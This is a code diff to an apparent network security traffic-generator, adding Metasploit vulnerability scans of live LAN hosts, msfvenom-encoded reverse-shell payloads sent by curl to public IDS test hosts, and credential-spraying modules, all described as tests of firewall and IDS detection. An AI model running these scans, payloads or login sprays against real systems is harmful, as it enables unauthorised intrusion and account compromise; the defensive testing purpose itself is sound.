@@ -58,7 +58,7 @@ from rich import box
 from endpoints import *           # noqa: F401,F403  (large data file)
 
 # ── Globals ───────────────────────────────────────────────────────────────────
-VERSION = "3.2.0"
+VERSION = "3.3.0"
 
 
 class _DualWriter:
@@ -253,6 +253,9 @@ _SUITE_DESCRIPTIONS: list[tuple[str, str]] = [
     ("malware-agents",   "HEAD requests to malware-category URLs using C2 framework user-agents (SASE/NGFW)"),
     ("malware-download", "Download known-malware file samples (to /dev/null)"),
     ("metasploit-check", "Run Metasploit .rc check scripts (no exploitation)"),
+    ("msf-aux-scan",    "Metasploit auxiliary vulnerability scanners (EternalBlue/BlueKeep/Heartbleed/Shellshock) → live LAN hosts only"),
+    ("msf-payload-delivery", "msfvenom encoded payloads delivered via HTTP to public test targets — tests NGFW/IDS obfuscated payload detection"),
+    ("msf-cred-spray",  "Metasploit credential-testing modules (SSH/SMB/FTP/HTTP) → public test targets only"),
     ("speedtest",        "fast.com speed-test via fastcli"),
     ("nmap",             "Nmap port scan (1-1024) + CVE script scan"),
     ("ntp",              "NTP UDP probes to a pool of public time servers"),
@@ -810,7 +813,10 @@ def _popen_kill_group(cmd: str, timeout: int,
 # Per-function wall-clock limits (seconds).  Functions not listed fall back to
 # 120 s.  These are upper-bounds; most tests complete well within the limit.
 _SUITE_TIMEOUTS: dict[str, int] = {
-    "metasploit_check":   360,
+    "metasploit_check":      360,
+    "msf_aux_scan":          480,
+    "msf_payload_delivery":  180,
+    "msf_cred_spray":        300,
     "web_scanner":        300,
     "lateral_movement_sim": 480,
     "nmap_1024os":        210,
@@ -1438,6 +1444,322 @@ def metasploit_check() -> None:
     except Exception as e:
         _stats.fail()
         ui_error(f"[metasploit_check] {e}")
+
+
+def msf_aux_scan() -> None:
+    """
+    Metasploit auxiliary vulnerability scanners against live LAN hosts only.
+
+    Safety model:
+      - Phase 1: nmap ping-sweep to discover live hosts (same as lateral-movement).
+      - Phase 2: MSF auxiliary scanners run ONLY against discovered live hosts —
+        never against the full subnet blindly.
+      - Respects --lateral-networks filter (same CIDRs as lateral-movement).
+      - Does NOT exploit — auxiliary scanners only probe for vulnerability
+        fingerprints (EternalBlue, BlueKeep, Heartbleed, Shellshock, Log4Shell).
+    """
+    import tempfile, ipaddress as _ipaddress, concurrent.futures, threading
+
+    _MSF_AUX_MODULES = [
+        # (module, description, extra_rc_lines)
+        ("auxiliary/scanner/smb/smb_ms17_010",
+         "EternalBlue (MS17-010)",
+         "set RPORT 445\nset THREADS 4"),
+        ("auxiliary/scanner/rdp/cve_2019_0708_bluekeep",
+         "BlueKeep (CVE-2019-0708)",
+         "set RPORT 3389\nset THREADS 4"),
+        ("auxiliary/scanner/ssl/openssl_heartbleed",
+         "Heartbleed (CVE-2014-0160)",
+         "set RPORT 443\nset THREADS 4"),
+        ("auxiliary/scanner/http/shellshock",
+         "Shellshock (CVE-2014-6271)",
+         "set RPORT 80\nset THREADS 4"),
+        ("auxiliary/scanner/http/log4shell_header_injection",
+         "Log4Shell HTTP scanner (CVE-2021-44228)",
+         "set RPORT 80\nset THREADS 4"),
+        ("auxiliary/scanner/smb/smb_enumshares",
+         "SMB share enumeration",
+         "set RPORT 445\nset THREADS 4"),
+        ("auxiliary/scanner/smb/smb_version",
+         "SMB version fingerprint",
+         "set RPORT 445\nset THREADS 4"),
+        ("auxiliary/scanner/rdp/rdp_scanner",
+         "RDP service detection",
+         "set RPORT 3389\nset THREADS 4"),
+    ]
+
+    ui_banner("MSF Aux Scan", "Metasploit auxiliary vulnerability scanners → LAN hosts only")
+
+    # Determine which networks to scan (respects --lateral-networks filter)
+    all_lans = _detect_host_lans()
+    lat_filter = [n.strip() for n in getattr(ARGS, "lateral_networks", "").split(",") if n.strip()]
+    if lat_filter:
+        lans = [(ip, cidr) for ip, cidr in all_lans if cidr in lat_filter] or all_lans
+    else:
+        lans = all_lans
+
+    if not lans:
+        ui_error("[msf_aux_scan] No host networks detected — skipping")
+        _stats.fail()
+        return
+
+    # Phase 1: ping sweep to discover live hosts (safe: only scan confirmed-live)
+    live_hosts: list[str] = []
+    _lock = threading.Lock()
+
+    def _sweep(gw_ip: str, subnet: str) -> None:
+        console.log(f"  [cyan]→[/] Ping sweep {subnet}")
+        out = subprocess.run(
+            ["nmap", "-sn", "--host-timeout", "5s", "-T4", subnet],
+            capture_output=True, text=True, timeout=120,
+        )
+        for line in out.stdout.splitlines():
+            if line.startswith("Nmap scan report for "):
+                parts = line.split()
+                raw = parts[-1].strip("()")
+                if raw and raw != gw_ip:
+                    with _lock:
+                        if raw not in live_hosts:
+                            live_hosts.append(raw)
+
+    try:
+        if len(lans) == 1:
+            _sweep(*lans[0])
+        else:
+            with concurrent.futures.ThreadPoolExecutor(max_workers=len(lans)) as pool:
+                concurrent.futures.wait([pool.submit(_sweep, gw, cidr) for gw, cidr in lans])
+    except Exception as e:
+        ui_error(f"[msf_aux_scan] ping sweep failed: {e}")
+        _stats.fail()
+        return
+
+    if not live_hosts:
+        console.log("  [yellow]No live hosts found — skipping MSF aux scan[/]")
+        _stats.ok()
+        return
+
+    console.log(f"  [green]Live hosts:[/] {', '.join(live_hosts)}")
+
+    # Phase 2: run MSF auxiliary modules against live hosts only
+    n_modules = _size_to_limits(ARGS.size, 2, 4, 6, len(_MSF_AUX_MODULES))
+    modules = random.sample(_MSF_AUX_MODULES, min(n_modules, len(_MSF_AUX_MODULES)))
+    rhosts = " ".join(live_hosts)
+
+    with tempfile.NamedTemporaryFile(mode="w", suffix=".rc", delete=False) as rc_f:
+        rc_path = rc_f.name
+        rc_f.write("setg VERBOSE false\n")
+        rc_f.write("setg ConnectTimeout 6\n")
+        rc_f.write("setg HttpClientTimeout 6\n")
+        rc_f.write(f"setg RHOSTS {rhosts}\n\n")
+        for mod, desc, extra in modules:
+            rc_f.write(f"# {desc}\n")
+            rc_f.write(f"use {mod}\n")
+            rc_f.write(f"{extra}\n")
+            rc_f.write("run\nback\nsleep 1\n\n")
+        rc_f.write("exit\n")
+
+    try:
+        with Progress(SpinnerColumn(), TextColumn("[cyan]MSF AUX[/]"),
+                      BarColumn(), TimeElapsedColumn(), console=console) as prog:
+            task = prog.add_task("scan", total=len(modules))
+            for mod, desc, _ in modules:
+                console.log(f"  [cyan]{mod}[/]  ({desc})")
+                prog.update(task, advance=1)
+            _popen_kill_group(f"msfconsole -q -r '{rc_path}'", timeout=300)
+        _stats.ok()
+        ui_ok("MSF auxiliary scan complete")
+    except Exception as e:
+        _stats.fail()
+        ui_error(f"[msf_aux_scan] {e}")
+    finally:
+        try:
+            os.unlink(rc_path)
+        except OSError:
+            pass
+
+
+def msf_payload_delivery() -> None:
+    """
+    Generate encoded Metasploit payloads via msfvenom and deliver them over
+    HTTP to designated safe test targets (scanme.nmap.org, testmyids.com).
+
+    The payloads are never executed — there is no listener and no target service.
+    The encoded bytes cross the wire so NGFW/SASE deep-packet inspection and
+    IDS/IPS can detect obfuscated malware-payload patterns in transit.
+
+    Safety model:
+      - Targets: ONLY scanme.nmap.org and testmyids.com (public, purpose-built
+        IDS/security-test hosts).  No LAN hosts are touched.
+      - Payloads are sent as HTTP POST bodies — they never land on disk at the
+        target and the connection will be refused or reset immediately.
+    """
+    import tempfile
+
+    _TARGETS = ["scanme.nmap.org", "testmyids.com"]
+    _ENCODERS = [
+        ("x86/shikata_ga_nai",     "linux/x86/shell_reverse_tcp", "elf",
+         "Shikata-ga-nai polymorphic XOR — strongest Snort/Suricata evasion test"),
+        ("x64/xor_dynamic",        "linux/x64/shell_reverse_tcp", "elf",
+         "x64 XOR dynamic — tests 64-bit shellcode detection"),
+        ("cmd/powershell_base64",  "cmd/windows/powershell_bind_tcp", "psh",
+         "PowerShell base64 — tests NGFW PowerShell payload inspection"),
+        ("x86/countdown",          "linux/x86/meterpreter_reverse_tcp", "elf",
+         "Countdown XOR — alternative x86 encoder coverage"),
+    ]
+
+    ui_banner("MSF Payload Delivery",
+              "msfvenom encoded payloads → HTTP to public test targets (IDS/NGFW inspection)")
+
+    n_encoders = _size_to_limits(ARGS.size, 1, 2, 3, len(_ENCODERS))
+    encoders = random.sample(_ENCODERS, min(n_encoders, len(_ENCODERS)))
+
+    with Progress(SpinnerColumn(), TextColumn("[cyan]PAYLOAD[/]"),
+                  MofNCompleteColumn(), BarColumn(), TimeElapsedColumn(),
+                  console=console) as prog:
+        task = prog.add_task("deliver", total=len(encoders) * len(_TARGETS))
+
+        for encoder, payload_type, fmt, desc in encoders:
+            with tempfile.NamedTemporaryFile(suffix=f".{fmt}", delete=False) as tf:
+                payload_path = tf.name
+
+            try:
+                # Generate encoded payload
+                gen_cmd = (
+                    f"msfvenom -p {payload_type} "
+                    f"LHOST=127.0.0.1 LPORT=4444 "
+                    f"-e {encoder} -i 3 "
+                    f"-f {fmt} -o '{payload_path}' 2>/dev/null"
+                )
+                result = subprocess.run(gen_cmd, shell=True, timeout=60,
+                                        stdout=subprocess.DEVNULL,
+                                        stderr=subprocess.DEVNULL)
+                if result.returncode != 0 or not os.path.getsize(payload_path):
+                    console.log(f"  [yellow]msfvenom failed for {encoder} — skipping[/]")
+                    _stats.fail()
+                    for _ in _TARGETS:
+                        prog.update(task, advance=1)
+                    continue
+
+                console.log(f"  [cyan]encoder:[/] {encoder}  ({desc})")
+
+                # Deliver to each test target via HTTP POST
+                for target in _TARGETS:
+                    url = f"http://{target}/traffgen-ids-test"
+                    try:
+                        curl_cmd = (
+                            f"curl -sk -X POST --data-binary @'{payload_path}' "
+                            f"-H 'Content-Type: application/octet-stream' "
+                            f"-H 'User-Agent: Mozilla/5.0 (traffgen-ids-test)' "
+                            f"--connect-timeout 4 --max-time 6 "
+                            f"'{url}' -o /dev/null -w '%{{http_code}}'"
+                        )
+                        r = subprocess.run(curl_cmd, shell=True, capture_output=True,
+                                           text=True, timeout=10)
+                        code = r.stdout.strip() or "---"
+                        console.log(
+                            f"    ↳ [{_status_style(code)}]{code}[/]  {target}"
+                        )
+                        _stats.ok()
+                    except Exception as ce:
+                        console.log(f"    ↳ [yellow]error: {ce}[/]")
+                        _stats.fail()
+                    finally:
+                        prog.update(task, advance=1)
+
+            except Exception as e:
+                console.log(f"  [yellow]msfvenom error ({encoder}): {e}[/]")
+                _stats.fail()
+                for _ in _TARGETS:
+                    prog.update(task, advance=1)
+            finally:
+                try:
+                    os.unlink(payload_path)
+                except OSError:
+                    pass
+
+    ui_ok("MSF payload delivery complete")
+
+
+def msf_cred_spray() -> None:
+    """
+    Metasploit credential-testing auxiliary modules against public test targets.
+
+    Generates the protocol-level brute-force traffic that UEBA, SIEM, and
+    identity-security tools signature-match — SSH login attempts, SMB auth,
+    FTP login probes — using obviously-fake credentials.
+
+    Safety model:
+      - Targets: ONLY scanme.nmap.org and testmyids.com.  No LAN hosts are
+        touched — credential spraying against production LAN hosts risks
+        account lockout and generates unauthorized-access events.
+      - Credentials: clearly fake (user='traffgen_test', pass='Traffgen!2025').
+      - STOP_ON_SUCCESS true — stops immediately if any credential works
+        (it won't, but this is the safe default).
+    """
+    import tempfile
+
+    _CRED_MODULES = [
+        ("auxiliary/scanner/ssh/ssh_login",
+         "SSH credential probe",
+         "set RPORT 22\nset STOP_ON_SUCCESS true\nset BLANK_PASSWORDS false\nset THREADS 2"),
+        ("auxiliary/scanner/ftp/ftp_login",
+         "FTP credential probe",
+         "set RPORT 21\nset STOP_ON_SUCCESS true\nset BLANK_PASSWORDS false\nset THREADS 2"),
+        ("auxiliary/scanner/smb/smb_login",
+         "SMB credential probe",
+         "set RPORT 445\nset STOP_ON_SUCCESS true\nset THREADS 2"),
+        ("auxiliary/scanner/http/http_login",
+         "HTTP Basic-Auth probe",
+         "set RPORT 80\nset STOP_ON_SUCCESS true\nset THREADS 2"),
+        ("auxiliary/scanner/telnet/telnet_login",
+         "Telnet credential probe",
+         "set RPORT 23\nset STOP_ON_SUCCESS true\nset THREADS 2"),
+    ]
+
+    _SAFE_TARGETS = ["scanme.nmap.org", "testmyids.com"]
+    _FAKE_USER = "traffgen_test"
+    _FAKE_PASS = "Traffgen!2025"
+
+    ui_banner("MSF Cred Spray",
+              "Metasploit credential-testing modules → public test targets only")
+
+    n_modules = _size_to_limits(ARGS.size, 2, 3, 4, len(_CRED_MODULES))
+    modules = random.sample(_CRED_MODULES, min(n_modules, len(_CRED_MODULES)))
+    rhosts = " ".join(_SAFE_TARGETS)
+
+    with tempfile.NamedTemporaryFile(mode="w", suffix=".rc", delete=False) as rc_f:
+        rc_path = rc_f.name
+        rc_f.write("setg VERBOSE false\n")
+        rc_f.write("setg ConnectTimeout 6\n")
+        rc_f.write(f"setg RHOSTS {rhosts}\n")
+        rc_f.write(f"setg USERNAME {_FAKE_USER}\n")
+        rc_f.write(f"setg PASSWORD {_FAKE_PASS}\n\n")
+        for mod, desc, extra in modules:
+            rc_f.write(f"# {desc}\n")
+            rc_f.write(f"use {mod}\n")
+            rc_f.write(f"{extra}\n")
+            rc_f.write("run\nback\nsleep 1\n\n")
+        rc_f.write("exit\n")
+
+    try:
+        with Progress(SpinnerColumn(), TextColumn("[cyan]MSF CRED[/]"),
+                      MofNCompleteColumn(), BarColumn(), TimeElapsedColumn(),
+                      console=console) as prog:
+            task = prog.add_task("spray", total=len(modules))
+            for mod, desc, _ in modules:
+                console.log(f"  [cyan]{mod}[/]  ({desc})")
+                prog.update(task, advance=1)
+            _popen_kill_group(f"msfconsole -q -r '{rc_path}'", timeout=240)
+        _stats.ok()
+        ui_ok("MSF cred spray complete")
+    except Exception as e:
+        _stats.fail()
+        ui_error(f"[msf_cred_spray] {e}")
+    finally:
+        try:
+            os.unlink(rc_path)
+        except OSError:
+            pass
 
 
 def _snmp_record(returncode: int, ip: str, label: str) -> None:
@@ -4218,7 +4540,10 @@ _SUITE_MAP: dict[str, list] = {
     "log4shell":        [log4shell_probe],
     "malware-agents":   [malware_random],
     "malware-download": [malware_download],
-    "metasploit-check": [metasploit_check],
+    "metasploit-check":      [metasploit_check],
+    "msf-aux-scan":          [msf_aux_scan],
+    "msf-payload-delivery":  [msf_payload_delivery],
+    "msf-cred-spray":        [msf_cred_spray],
     "speedtest":        [speedtest_fast],
     "nmap":             [nmap_1024os, nmap_cve],
     "ntp":              [ntp_random],
